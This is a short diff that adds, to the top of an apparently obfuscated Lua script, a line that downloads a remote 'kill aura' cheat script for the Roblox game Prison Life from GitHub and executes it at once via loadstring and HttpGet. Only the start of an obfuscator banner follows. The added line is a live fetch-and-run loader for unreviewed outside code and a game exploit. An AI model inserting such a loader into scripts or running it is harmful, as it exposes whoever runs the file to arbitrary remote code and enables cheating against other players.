@@ -1,3 +1,6 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/CyberStudioUnited/KILL-AURA-PRISON-LIFE/main/script_main.lua'))()
+
+
 --[[
  .____                  ________ ___.    _____                           __                
  |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
